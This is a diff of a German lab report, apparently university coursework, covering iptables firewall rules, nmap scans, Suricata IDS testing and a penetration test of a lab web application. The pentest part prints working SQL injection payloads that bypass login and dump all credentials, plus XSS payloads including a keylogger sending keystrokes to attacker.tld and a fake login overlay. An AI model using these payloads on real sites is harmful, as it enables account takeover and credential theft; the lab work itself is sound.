@@ -94,7 +94,141 @@ Es findet keine direkte Kommunikation zwischen dem Client und dem Webserver stat
 Der Switch wird in dem Informationsfluss nicht behandelt, da dieser lediglich die physische Verbindung der Komponenten realisiert und keine sonstige Funktion oder Filter umsetzt.
 
 \newpage
-\section{Konfiguration der Server}
+\section{Aufgabenblatt 1}
+
+Folgende Abschnitte zeigen und erläutern die Konfiguration der einzelnen iptables-Paketfilter.
+
+\subsection{Firewall}\label{config-firewall-fw}
+Im folgenden werden die Anforderungen und die Konfiguration von iptables auf der Firewall erläutert.
+
+\subsubsection{Anforderungen}
+Folgende Anforderungen wurden aus dem Aufgabenblatt 1 identifiziert und werden zusätzlich für die Administration und den normalen Betrieb benötigt:
+\begin{table}[h!]
+	\begin{center}
+		\label{tab:table3}
+		\begin{tabular}{ r | l | l }
+			\textbf{Port} & \textbf{Protokoll} & \textbf{Dienst} \\
+			\hline
+			22 & TCP & SSH \\
+			53 & TCP & DNS \\
+			53 & UDP & DNS \\
+			123 & UDP & NTP \\
+			80 & TCP & HTTP \\
+			443 & TCP & HTTPS \\
+			143 & TCP & Outlook IMAP \\
+			993 & TCP & Outlook IMAP \\
+			110 & TCP & Outlook POP3 \\
+			995 & TCP & Outlook POP3 \\
+			587 & TCP & Outlook SMTP \\
+			5938 & TCP & TeamViewer \\
+			5938 & UDP & TeamViewer \\
+			8081 & TCP & TeamViewer \\
+		\end{tabular}
+		\caption{Benötigte Ports auf der Firewall}
+	\end{center}
+\end{table}
+\\
+Bei den Freigegeben Ports wurden die Richtlinien und Anforderungen der jeweiligen Hersteller \cite{ashaiyengar-2023}, \cite{teamviewer-2024} beachtet. \\ \\
+Port 22 wird für SSH genutzt um den Server zu administrieren. \\
+Die Ports 53 und 123, entsprechend DNS und NTP, werden für den regulären Betrieb des Servers benötigt. NTP wird benötigt um die korrekte Zeit zu haben und das Logging und Auswerten zu vereinfachen. \\
+Ports 80 und 443 werden für den HTTP-Verkehr genutzt, damit verbundene Clients, wie Mitarbeiter, Zugang zum Internet erhalten. \\
+Da sich kein lokaler E-Mail- oder Exchange-Server im Verbund auf Arbeitsblatt 1 befindet, wird davon ausgegangen das es einen externen Server gibt. Die Ports 143 und 993, 110 und 995 sowie 587 ermöglichen verschiedene Wege der Anmeldung auf diesem Server. \\
+TeamViewer benötigt den Port 5938 um den Zugang zu ermöglichen. \\
+Der Lizenzserver von Delftship benötigt den Port 8081 \cite{delftship}.
+
+\subsubsection{Skripte}
+Nach den Vorgaben aus Aufgabenblatt 1 und den identifizierten Anforderungen ergeben sich die folgende Skripte für iptables. Alle Skripte müssen mit  Root Rechten ausgeführt werden.  Iptables Regeln wurden gemäß der iptables man page \cite{iptables-manpage} angelegt. \\ \\ 
+Bei allen folgenden Skripten werden anfangs alle bestehenden Regeln gelöscht, um Konflikte mit den neuen Regeln zu verhindern. \\ \\
+Folgender Skript schließt alle Ports der Firewall:
+\lstinputlisting[breaklines]{./scripts/all-ports-closed.sh}
+Folgender Skript öffnet die Firewall komplett und erlaubt jede Art von Datenverkehr:
+\lstinputlisting[breaklines]{./scripts/all-ports-open.sh}
+Folgender  Skript setzt die Anforderungen für die Umgebung um und ermöglicht das Forwarding auf den Webserver. Zusätzlich  wird  Datenverkehr auf dem  loopback-Interface erlaubt. \\
+Dieser Skript wird durch einen Cron-Job direkt nach dem Boot ausgeführt, siehe Kapitel \ref{cron-job}.
+\lstinputlisting[breaklines]{./scripts/ports-prod.sh}
+Zusätzlich zu den Ports wird das ICMP-Protokoll zugelassen, um Pings für Diagnosezwecke zu gestatten.
+\\ \\
+Um das Forwarding von IPv4 Paketen zu ermöglichen musste der Kernel-Parameter \lstinline[breaklines]|net.ipv4.ip_forward| auf 1, statt 0, gesetzt werden \cite{ipv4forward-kernel}. 
+
+\subsection{Webserver}\label{config-firewall-ws}
+Im folgenden werden die Anforderungen an die iptables-Regeln auf dem Webservers beschrieben und der Skript der diese umsetzt gezeigt.
+
+\subsubsection{Anforderungen}
+Folgende Ports wurden als relevant identifiziert um dem Webserver zu administrieren und die Python-Anwendung bereitzustellen:
+\begin{table}[h!]
+	\begin{center}
+		\label{tab:table4}
+		\begin{tabular}{l|l |l }
+			\textbf{Port} & \textbf{Protokoll} & \textbf{Dienst} \\
+			\hline
+			22 & TCP & SSH \\
+			80 & TCP & HTTP \\
+		\end{tabular}
+		\caption{Benötigte Ports auf dem Webserver}
+	\end{center}
+\end{table}
+
+\subsubsection{Skript}
+Folgender  Skript setzt die iptables Regeln auf dem Webserver. Der  Skript muss mit Root Rechten ausgeführt  werden.
+Iptables Regeln wurden gemäß der iptables man page \cite{iptables-manpage} angelegt. \\
+Der Skript wird direkt am Boot mittels eines Cron-Jobs ausgeführt, siehe Kapitel \ref{cron-job}.
+\lstinputlisting[breaklines]{./scripts/ports-webserver.sh}
+Zuerst werden  alle bestehenden Regeln gelöscht, um Konflikte vorzubeugen. \\
+Der Skript ermöglicht den Managementzugang mittels SSH sowie Pings auf und vom  Server. \\
+Der HTTP-Verkehr wird auf die IP-Adresse \lstinline[breaklines]|192.168.0.220|, die Firewall, beschränkt. Anderen Clients ist es also nicht möglich den Webserver direkt anzufragen. \\
+Besonders relevant ist es den Verkehr auf dem Loopback-Interface zuzulassen, da die Python-Anwendung dies benötigt um auf die Datenbank zuzugreifen.
+
+\subsection{Test der iptables Regeln}
+
+\subsubsection{Ping}
+Im folgenden wurde ein einfacher Ping, mit dem Befehl \lstinline[breaklines]|ping -4 -c 5 192.168.0.220|.
+Folgende Parameter wurden genutzt \cite{ping-manpage}:
+\begin{enumerate}
+	\item \lstinline[breaklines]|-4|: Benutze ausschließlich IPv4, da die Server nur eine IPv4 Adresse und keine IPv6 Adressen haben.
+	\item \lstinline[breaklines]|-c 5|: Sende insgesamt 5 Pakete. 5 Pakete wurden als ausreichend beurteilt um die Funktion der Firewall zu zeigen. 
+\end{enumerate}
+
+TODO hier Screenshots für alles offen, alles zu und production
+
+\subsubsection{NMAP Scan}
+Sowohl der Webserver als auch die Firewall wurden mit dem Befehl  \lstinline[breaklines]|sudo nmap -sS -sC -O -p- <ip des ziels>| mittels NMAP gescanned. 
+Folgende Parameter wurden genutzt \cite{nmap-manual}:
+\begin{enumerate}
+	\item \lstinline[breaklines]|-sS|: Führe einen ''SYN Scan'' bzw. ''Stealth Scan'' durch. Damit wurden die offenen TCP-Ports gescanned. 
+	\item \lstinline[breaklines]|-sC|: Führe einen ''Script Scan'' durch. Hierbei werden verschiedene Scripte eingesetzt um mehr Informationen über verschiedene Ports und Dienste zu erhalten.
+	\item \lstinline[breaklines]|-O|: Versuche das Betriebssystem des Ziels zu erhalten.
+	\item \lstinline[breaklines]|-p-|: Scanne alle Ports von 1 bis 65535.
+\end{enumerate} 
+Folgende Ergebnisse ergab der NMAP-Scan der Firewall und des Webservers: \\ \\
+\begin{figure}[!ht]
+	\centering
+	\includegraphics[width=15cm]{nmap-scan-firewall.png}
+	\caption{Ergebnis NMAP-Scan Firewall}
+	\label{fig:nmapfirewall}
+\end{figure} 
+\begin{figure}[!ht]
+	\centering
+	\includegraphics[width=15cm]{nmap-scan-webserver.png}
+	\caption{Ergebnis NMAP-Scan Webserver}
+	\label{fig:nmapwebserver}
+\end{figure}
+\\ \\
+Hervorzuheben ist, dass der Scan der Webservers nur den Port 22, SSH, gefunden hat, nicht den Port 80 für den NGINX-Server. Die Regel, das Port 80 auf dem Webserver nur auf Anfragen von der IP-Adresse der Firewall annimmt funktioniert dementsprechend.
+\\ \\
+Zudem war Suricata in der Lage den NMAP-Scan, den Script-Scan, zu entdecken und zu melden.
+\begin{figure}[!ht]
+	\centering
+	\includegraphics[width=17cm]{suricata-detection-nmap-scan.png}
+	\caption{Logs von Suricata bei der Durchführung des NMAP-Scans}
+	\label{fig:nmapsuricata}
+\end{figure}
+
+\subsubsection{DOS Angriff}
+
+TODO HIER NOCH MACHEN
+
+\newpage
+\section{Aufgabenlatt 2}
 Folgende Abschnitte beschreiben die Konfiguration der Firewall und des Webservers.
 
 \subsection{Firewall}
@@ -183,222 +317,76 @@ Die Datenbank wurde mit folgenden Skript initialisiert:
 Es wird ein neue Datenbank mit dem Namen \lstinline[breaklines]|mydb| angelegt. Zusätzlich wird ein neuer Nutzer \lstinline[breaklines]|admin| angelegt. Anschließend wird die Tabelle \lstinline[breaklines]|credentials| angelegt, in welcher die Daten später gespeichert werden. In diese wird ein Testnutzer hineingeschrieben. Dem Nutzer \lstinline[breaklines]|admin| werden zuletzt alle Rechte für die neue Datenbank zugeteilt. \\ \\
 Es wurden keine weiteren spezifischen Konfigurationen durchgeführt um MariaDB zu schützen.
 
-\newpage
-\section{Konfiguration von iptables}
-Folgende Abschnitte zeigen und erläutern die Konfiguration der einzelnen iptables-Paketfilter.
+\subsection{Angriff auf den Webserver}
+Im folgenden werden die Angriffe auf den Webserver, eine SQL Injection und Cross-Site-Scripting Attacke, beschrieben.
 
-\subsection{Firewall}\label{config-firewall-fw}
-Im folgenden werden die Anforderungen und die Konfiguration von iptables auf der Firewall erläutert.
-
-\subsubsection{Anforderungen}
-Folgende Anforderungen wurden aus dem Aufgabenblatt 1 identifiziert und werden zusätzlich für die Administration und den normalen Betrieb benötigt:
-\begin{table}[h!]
-	\begin{center}
-		\label{tab:table3}
-		\begin{tabular}{ r | l | l }
-			\textbf{Port} & \textbf{Protokoll} & \textbf{Dienst} \\
-			\hline
-			22 & TCP & SSH \\
-			53 & TCP & DNS \\
-			53 & UDP & DNS \\
-			123 & UDP & NTP \\
-			80 & TCP & HTTP \\
-			443 & TCP & HTTPS \\
-			143 & TCP & Outlook IMAP \\
-			993 & TCP & Outlook IMAP \\
-			110 & TCP & Outlook POP3 \\
-			995 & TCP & Outlook POP3 \\
-			587 & TCP & Outlook SMTP \\
-			5938 & TCP & TeamViewer \\
-			5938 & UDP & TeamViewer \\
-			8081 & TCP & TeamViewer \\
-		\end{tabular}
-		\caption{Benötigte Ports auf der Firewall}
-	\end{center}
-\end{table}
-\\
-Bei den Freigegeben Ports wurden die Richtlinien und Anforderungen der jeweiligen Hersteller \cite{ashaiyengar-2023}, \cite{teamviewer-2024} beachtet. \\ \\
-Port 22 wird für SSH genutzt um den Server zu administrieren. \\
-Die Ports 53 und 123, entsprechend DNS und NTP, werden für den regulären Betrieb des Servers benötigt. NTP wird benötigt um die korrekte Zeit zu haben und das Logging und Auswerten zu vereinfachen. \\
-Ports 80 und 443 werden für den HTTP-Verkehr genutzt, damit verbundene Clients, wie Mitarbeiter, Zugang zum Internet erhalten. \\
-Da sich kein lokaler E-Mail- oder Exchange-Server im Verbund auf Arbeitsblatt 1 befindet, wird davon ausgegangen das es einen externen Server gibt. Die Ports 143 und 993, 110 und 995 sowie 587 ermöglichen verschiedene Wege der Anmeldung auf diesem Server. \\
-TeamViewer benötigt den Port 5938 um den Zugang zu ermöglichen. \\
-Der Lizenzserver von Delftship benötigt den Port 8081 \cite{delftship}.
-
-\subsubsection{Skripte}
-Nach den Vorgaben aus Aufgabenblatt 1 und den identifizierten Anforderungen ergeben sich die folgende Skripte für iptables. Alle Skripte müssen mit  Root Rechten ausgeführt werden.  Iptables Regeln wurden gemäß der iptables man page \cite{iptables-manpage} angelegt. \\ \\ 
-Bei allen folgenden Skripten werden anfangs alle bestehenden Regeln gelöscht, um Konflikte mit den neuen Regeln zu verhindern. \\ \\
-Folgender Skript schließt alle Ports der Firewall:
-\lstinputlisting[breaklines]{./scripts/all-ports-closed.sh}
-Folgender Skript öffnet die Firewall komplett und erlaubt jede Art von Datenverkehr:
-\lstinputlisting[breaklines]{./scripts/all-ports-open.sh}
-Folgender  Skript setzt die Anforderungen für die Umgebung um und ermöglicht das Forwarding auf den Webserver. Zusätzlich  wird  Datenverkehr auf dem  loopback-Interface erlaubt. \\
-Dieser Skript wird durch einen Cron-Job direkt nach dem Boot ausgeführt, siehe Kapitel \ref{cron-job}.
-\lstinputlisting[breaklines]{./scripts/ports-prod.sh}
-Zusätzlich zu den Ports wird das ICMP-Protokoll zugelassen, um Pings für Diagnosezwecke zu gestatten.
-\\ \\
-Um das Forwarding von IPv4 Paketen zu ermöglichen musste der Kernel-Parameter \lstinline[breaklines]|net.ipv4.ip_forward| auf 1, statt 0, gesetzt werden \cite{ipv4forward-kernel}. 
-
-\subsection{Webserver}\label{config-firewall-ws}
-Im folgenden werden die Anforderungen an die iptables-Regeln auf dem Webservers beschrieben und der Skript der diese umsetzt gezeigt.
-
-\subsubsection{Anforderungen}
-Folgende Ports wurden als relevant identifiziert um dem Webserver zu administrieren und die Python-Anwendung bereitzustellen:
-\begin{table}[h!]
-	\begin{center}
-		\label{tab:table4}
-		\begin{tabular}{l|l |l }
-			\textbf{Port} & \textbf{Protokoll} & \textbf{Dienst} \\
-			\hline
-			22 & TCP & SSH \\
-			80 & TCP & HTTP \\
-		\end{tabular}
-		\caption{Benötigte Ports auf dem Webserver}
-	\end{center}
-\end{table}
-
-\subsubsection{Skript}
-Folgender  Skript setzt die iptables Regeln auf dem Webserver. Der  Skript muss mit Root Rechten ausgeführt  werden.
-Iptables Regeln wurden gemäß der iptables man page \cite{iptables-manpage} angelegt. \\
-Der Skript wird direkt am Boot mittels eines Cron-Jobs ausgeführt, siehe Kapitel \ref{cron-job}.
-\lstinputlisting[breaklines]{./scripts/ports-webserver.sh}
-Zuerst werden  alle bestehenden Regeln gelöscht, um Konflikte vorzubeugen. \\
-Der Skript ermöglicht den Managementzugang mittels SSH sowie Pings auf und vom  Server. \\
-Der HTTP-Verkehr wird auf die IP-Adresse \lstinline[breaklines]|192.168.0.220|, die Firewall, beschränkt. Anderen Clients ist es also nicht möglich den Webserver direkt anzufragen. \\
-Besonders relevant ist es den Verkehr auf dem Loopback-Interface zuzulassen, da die Python-Anwendung dies benötigt um auf die Datenbank zuzugreifen.
-
-\newpage
-\section{Konfiguration des Intrusion Detection Systems}\label{config-ids}
-Es wurde sich für das Intrusion Detection System (IDS) Suricata entschieden, da bereits Vorerfahrung bestanden. \\ \\
-Bei der Installation wurde der Anleitung des Herstellers \cite{suricata-quickstart} befolgt. \\
-In der Konfigurationsdatei \lstinline[breaklines]|/etc/suricata/suricata.yaml| wurde das zu überwachende Interface auf \lstinline[breaklines]|eth0| gestellt. Es ergeben sich folgende Capture Settings:
-\begin{lstlisting}[breaklines]
-af-packet:
-	- interface: eth0
-	  cluster-id: 99
-	  cluster-type: cluster_flow
-	  defrag: yes
-	  use-mmap: yes
-	  tpacket-v3: yes
-\end{lstlisting}
-Darüber hinaus wurden die aktuellen Regeln,  mittels \lstinline[breaklines]|sudo suricata-update|, heruntergeladen, installiert und aktiviert \cite{suricata-rulemanagement}. \\
-Um diese zu aktivieren wurde gemäß der Anleitung des Herstellers der Pfad der Regeln, in der Datei \lstinline[breaklines]|/etc/suricata/suricata.yaml| geändert auf \\ \lstinline[breaklines]|default-rule-path: /var/lib/suricata/rules|. \\ \\
-Weitere Konfiguration wurden nicht durchgeführt. \\ \\
-Das IDS wurde anschließend getestet. Dafür wurde der Befehl
-\lstinline[breaklines]|curl http://testmynids.org/uid/index.html|
-ausgeführt. Dadurch wurde eine statische HTML-Datei aufgerufen mit dem Inhalt 
-\lstinline[breaklines]|uid=0(root) gid=0(root) groups=0(root)| 
-Dieser String stellt eine mögliche Ausgabe des \lstinline[breaklines]|id| Befehls dar, welcher genutzt werden kann um den derzeitigen Nutzer und die Gruppen des Nutzers zu erhalten. \\ \\
-Das IDS sollte hier ausschlagen, da die Ausgabe bedeuten würde, das jemand remote den \lstinline[breaklines]|id| Befehl als root ausgeführt hat, was bedeuten würde das jemand vollen Zugriff auf das System hat. \\ \\
-Ob das IDS dies erkannt hat wurde mit dem Befehl
-\lstinline[breaklines]|sudo tail /var/log/suricata/fast.log| 
-überprüft. Die \lstinline[breaklines]|fast.log| Datei enthält die Warnungen des IDS. 
-Die letzte Zeile der Datei war \lstinline[breaklines]|[1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} <ip> -> 192.168.0.220:<port>|. Dies zeigt das der Datenverkehr als potenzieller Datenabfluss erkannt wurde.
-
-\newpage
-\section{Penetrationstest des Informationsverbunds}
-Folgende Kapitel befassen sich mit den im Penetrationstest durchgeführten Angriffen und den Aufgaben der IT-Forensik.
-
-\subsection{NMAP}
-Sowohl der Webserver als auch die Firewall wurden mit dem Befehl  \lstinline[breaklines]|sudo nmap -sS -sC -O -p- <ip des ziels>| mittels NMAP gescanned. 
-Folgende Parameter wurden genutzt \cite{nmap-manual}:
-\begin{enumerate}
-	\item \lstinline[breaklines]|-sS|: Führe einen ''SYN Scan'' bzw. ''Stealth Scan'' durch. Damit wurden die offenen TCP-Ports gescanned. 
-	\item \lstinline[breaklines]|-sC|: Führe einen ''Script Scan'' durch. Hierbei werden verschiedene Scripte eingesetzt um mehr Informationen über verschiedene Ports und Dienste zu erhalten.
-	\item \lstinline[breaklines]|-O|: Versuche das Betriebssystem des Ziels zu erhalten.
-	\item \lstinline[breaklines]|-p-|: Scanne alle Ports von 1 bis 65535.
-\end{enumerate} 
-Folgende Ergebnisse ergab der NMAP-Scan der Firewall und des Webservers: \\ \\
-\begin{figure}[!ht]
-	\centering
-	\includegraphics[width=15cm]{nmap-scan-firewall.png}
-	\caption{Ergebnis NMAP-Scan Firewall}
-	\label{fig:nmapfirewall}
-\end{figure} 
-\begin{figure}[!ht]
-	\centering
-	\includegraphics[width=15cm]{nmap-scan-webserver.png}
-	\caption{Ergebnis NMAP-Scan Webserver}
-	\label{fig:nmapwebserver}
-\end{figure}
-\\ \\
-Hervorzuheben ist, dass der Scan der Webservers nur den Port 22, SSH, gefunden hat, nicht den Port 80 für den NGINX-Server. Die Regel, das Port 80 auf dem Webserver nur auf Anfragen von der IP-Adresse der Firewall annimmt funktioniert dementsprechend.
-\\ \\
-Zudem war Suricata in der Lage den NMAP-Scan, den Script-Scan, zu entdecken und zu melden.
-\begin{figure}[!ht]
-	\centering
-	\includegraphics[width=17cm]{suricata-detection-nmap-scan.png}
-	\caption{Logs von Suricata bei der Durchführung des NMAP-Scans}
-	\label{fig:nmapsuricata}
-\end{figure}
-
-\subsection{SQL Injection}
+\subsubsection{SQL Injection}
 Um die Anfälligkeit der Webanwendung für SQL Injection zu testen, wurde ein Angriff auf das Login-Formular simuliert. Zunächst wurde ein einfacher Test mit dem Benutzernamen \lstinline[breaklines]|';''| und einem beliebigen Passwort durchgeführt. Dies führte zu einem internen Serverfehler (HTTP 500), der wertvolle Informationen über die zugrunde liegende Datenbankabfrage preisgab.
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=15cm]{sql-login-error-message.png}
-    \caption{Fehlermeldung beim Login in der Webanwendung}
-    \label{fig:sql-login-error-message}
+	\centering
+	\includegraphics[width=15cm]{sql-login-error-message.png}
+	\caption{Fehlermeldung beim Login in der Webanwendung}
+	\label{fig:sql-login-error-message}
 \end{figure}
 
 \noindent Die Analyse des Fehlerlogs in den Entwicklertools des Browsers offenbarte die verwendete SQL-Abfrage aus der Webanwendung.
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=15cm]{sql-login-error-response.png}
-    \caption{Response der Webanwendung}
-    \label{fig:sql-login-error-response}
+	\centering
+	\includegraphics[width=15cm]{sql-login-error-response.png}
+	\caption{Response der Webanwendung}
+	\label{fig:sql-login-error-response}
 \end{figure}
 
 \noindent Mit diesem Wissen wurde eine angepasste Injection erstellt:
 \begin{lstlisting}[breaklines]
-' union select 1,'itsec','attack'; -- '
+	' union select 1,'itsec','attack'; -- '
 \end{lstlisting}
 Diese Eingabe als Benutzername, kombiniert mit \lstinline|attack| als Passwort, ermöglicht eine unbefugte Anmeldung als \lstinline|itsec| oder potenziell als jeder andere Benutzer.
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=15cm]{sql-injection-login-attempt.png}
-    \caption{Login mit SQL Injection}
-    \label{fig:sql-injection-login-attempt}
+	\centering
+	\includegraphics[width=15cm]{sql-injection-login-attempt.png}
+	\caption{Login mit SQL Injection}
+	\label{fig:sql-injection-login-attempt}
 \end{figure}
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=15cm]{sql-injection-login-success.png}
-    \caption{Erfolgreiche Anmeldung mit SQL Injection}
-    \label{fig:sql-injection-login-success}
+	\centering
+	\includegraphics[width=15cm]{sql-injection-login-success.png}
+	\caption{Erfolgreiche Anmeldung mit SQL Injection}
+	\label{fig:sql-injection-login-success}
 \end{figure}
 
 \noindent Um die Möglichkeiten der SQL Injection weiter zu demonstrieren, wurde eine alternative Injection entwickelt, um alle Benutzerdaten zu extrahieren:
 \begin{lstlisting}[breaklines]
-' union select 1, group_concat(concat_ws('|', user, password) separator ', '), 'attack' from credentials -- '
+	' union select 1, group_concat(concat_ws('|', user, password) separator ', '), 'attack' from credentials -- '
 \end{lstlisting}
 Diese Injection wird ebenfalls als Benutzername eingegeben, während \lstinline|attack| wieder als Passwort verwendet wird. Als Ergebnis enthält der angezeigte Benutzername in der Webanwendung nun alle extrahierten Daten aus der Datenbanktabelle, wie in der folgenden Abbildung zu sehen ist:
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=14cm]{sql-injection-data-extraction.png}
-    \caption{Extraktion aller Benutzerdaten mit SQL Injection}
-    \label{fig:sql-injection-data-extraction}
+	\centering
+	\includegraphics[width=14cm]{sql-injection-data-extraction.png}
+	\caption{Extraktion aller Benutzerdaten mit SQL Injection}
+	\label{fig:sql-injection-data-extraction}
 \end{figure}
 
 \FloatBarrier
 
-\subsection{Cross-Site Scripting}
+\subsubsection{Cross-Site Scripting}
 Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstrieren, wurden verschiedene Methoden der Code-Injektion in das Message Board getestet, das nach erfolgreicher Anmeldung zugänglich ist.
 
 \noindent Zunächst wurde ein einfacher JavaScript-Code injiziert, der eine Alert-Box mit dem Text \lstinline|test| anzeigen sollte:
 \begin{lstlisting}[breaklines]
-<script>alert('test')</script>
+	<script>alert('test')</script>
 \end{lstlisting}
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=8cm]{xss-script-injection-fail.png}
-    \caption{Fehlgeschlagene Ausführung des JavaScript-Codes}
-    \label{fig:xss-script-injection-fail}
+	\centering
+	\includegraphics[width=8cm]{xss-script-injection-fail.png}
+	\caption{Fehlgeschlagene Ausführung des JavaScript-Codes}
+	\label{fig:xss-script-injection-fail}
 \end{figure}
 
 \noindent Trotz erfolgreicher Injektion des Codes geschah jedoch nichts Sichtbares auf der Webseite.
@@ -406,22 +394,22 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
 \noindent Bei näherer Untersuchung zeigte sich, dass der Code zwar in den HTML-Quelltext eingefügt wurde, aber von Firefox ignoriert wurde. Dies war an der grauen Hinterlegung im Quelltext erkennbar, wie die folgende Abbildung zeigt:
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=12cm]{xss-script-injection-html.png}
-    \caption{HTML-Quelltext mit grau hinterlegtem JavaScript-Code}
-    \label{fig:xss-script-injection-html}
+	\centering
+	\includegraphics[width=12cm]{xss-script-injection-html.png}
+	\caption{HTML-Quelltext mit grau hinterlegtem JavaScript-Code}
+	\label{fig:xss-script-injection-html}
 \end{figure}
 
 \noindent Als Alternative wurde ein <img>-Tag mit dem onerror-Attribut verwendet. Diese Methode zielt darauf ab, JavaScript-Code auszuführen, wenn das Laden eines Bildes fehlschlägt:
 \begin{lstlisting}[breaklines]
-<img src="" onerror=alert('test')>
+	<img src="" onerror=alert('test')>
 \end{lstlisting}
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=14cm]{xss-img-tag-injection-success.png}
-    \caption{Erfolgreiche XSS-Ausführung mit img-Tag}
-    \label{fig:xss-img-tag-injection-success}
+	\centering
+	\includegraphics[width=14cm]{xss-img-tag-injection-success.png}
+	\caption{Erfolgreiche XSS-Ausführung mit img-Tag}
+	\label{fig:xss-img-tag-injection-success}
 \end{figure}
 \begin{figure}[H]
 	\centering
@@ -436,7 +424,7 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
 
 \noindent Zunächst wurde ein Keylogger eingesetzt, der jeden Tastendruck an einen externen Server sendet:
 \begin{lstlisting}[breaklines]
-<img src="" onerror="document.addEventListener('keypress', function(e) { fetch('http://attacker.tld?key=' + String.fromCharCode(e.which)); }); this.remove();">
+	<img src="" onerror="document.addEventListener('keypress', function(e) { fetch('http://attacker.tld?key=' + String.fromCharCode(e.which)); }); this.remove();">
 \end{lstlisting}
 
 \noindent Für diese Demonstration wurde die fiktive Adresse \lstinline|attacker.tld| als Zielserver verwendet.
@@ -444,10 +432,10 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
 \noindent Der resultierende Netzwerkverkehr, der die gesendeten Tastendrücke zeigt, ist in der folgenden Abbildung dargestellt:
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=15cm]{xss-keylogger-network-traffic.png}
-    \caption{Netzwerkverkehr des XSS-Keyloggers}
-    \label{fig:xss-keylogger-network-traffic}
+	\centering
+	\includegraphics[width=15cm]{xss-keylogger-network-traffic.png}
+	\caption{Netzwerkverkehr des XSS-Keyloggers}
+	\label{fig:xss-keylogger-network-traffic}
 \end{figure}
 
 \begin{figure}[H]
@@ -459,37 +447,67 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
 
 \noindent Dann wurde eine Phishing-Seite imitiert, die eine legitime Website nachahmt, mit dem Ziel Benutzerdaten zu stehlen:
 \begin{lstlisting}[breaklines]
-<img src="" onerror="(function(){
-  document.body.innerHTML = `
-    <div style='position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center;'>
-      <div style='background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center;'>
-        <h2 style='color: #1877f2; font-family: Helvetica, Arial, sans-serif; margin-bottom: 20px;'>Website</h2>
-        <form>
-          <input type='text' placeholder='Email or Phone Number' style='width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
-          <input type='password' placeholder='Password' style='width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
-          <button type='submit' style='width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;'>Log In</button>
-        </form>
-        <div style='margin-top: 10px;'>
-          <a href='#' style='color: #1877f2; font-size: 14px; text-decoration: none;'>Forgotten password?</a>
-        </div>
-      </div>
-    </div>
-  `;
-}())">
+	<img src="" onerror="(function(){
+		document.body.innerHTML = `
+		<div style='position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center;'>
+		<div style='background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center;'>
+		<h2 style='color: #1877f2; font-family: Helvetica, Arial, sans-serif; margin-bottom: 20px;'>Website</h2>
+		<form>
+		<input type='text' placeholder='Email or Phone Number' style='width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
+		<input type='password' placeholder='Password' style='width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;'>
+		<button type='submit' style='width: 100%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;'>Log In</button>
+		</form>
+		<div style='margin-top: 10px;'>
+		<a href='#' style='color: #1877f2; font-size: 14px; text-decoration: none;'>Forgotten password?</a>
+		</div>
+		</div>
+		</div>
+		`;
+	}())">
 \end{lstlisting}
 
 \noindent Diese Injektion ersetzt den gesamten Inhalt der Webseite durch eine Login-Maske, die Benutzer zur Eingabe ihrer Anmeldedaten verleiten könnte. Das Ergebnis dieser Injektion ist in der folgenden Abbildung dargestellt:
 
 \begin{figure}[H]
-    \centering
-    \includegraphics[width=17cm]{xss-phishing-page-injection.png}
-    \caption{Darstellung der XSS-injizierten Phishing-Seite}
-    \label{fig:xss-phishing-page-injection}
+	\centering
+	\includegraphics[width=17cm]{xss-phishing-page-injection.png}
+	\caption{Darstellung der XSS-injizierten Phishing-Seite}
+	\label{fig:xss-phishing-page-injection}
 \end{figure}
 
 \noindent Wie man sehen kann, wurde die ursprüngliche Webseite vollständig durch eine gefälschte Login-Maske ersetzt. Dies verdeutlicht das erhebliche Risiko, das von XSS-Schwachstellen ausgeht.
 
 \FloatBarrier
+
+\newpage
+\section{Aufgabenblatt 3}
+Im folgenden wird die Konfiguration des Intrusion Detection System (IDS) beschrieben. Es wurde sich für das IDS Suricata entschieden, da bereits Vorerfahrung bestanden.
+
+\subsection{Konfiguration des Intrusion Detection Systems}\label{config-ids}
+Bei der Installation wurde der Anleitung des Herstellers \cite{suricata-quickstart} befolgt. \\
+In der Konfigurationsdatei \lstinline[breaklines]|/etc/suricata/suricata.yaml| wurde das zu überwachende Interface auf \lstinline[breaklines]|eth0| gestellt. Es ergeben sich folgende Capture Settings:
+\begin{lstlisting}[breaklines]
+	af-packet:
+	- interface: eth0
+	cluster-id: 99
+	cluster-type: cluster_flow
+	defrag: yes
+	use-mmap: yes
+	tpacket-v3: yes
+\end{lstlisting}
+Darüber hinaus wurden die aktuellen Regeln,  mittels \lstinline[breaklines]|sudo suricata-update|, heruntergeladen, installiert und aktiviert \cite{suricata-rulemanagement}. \\
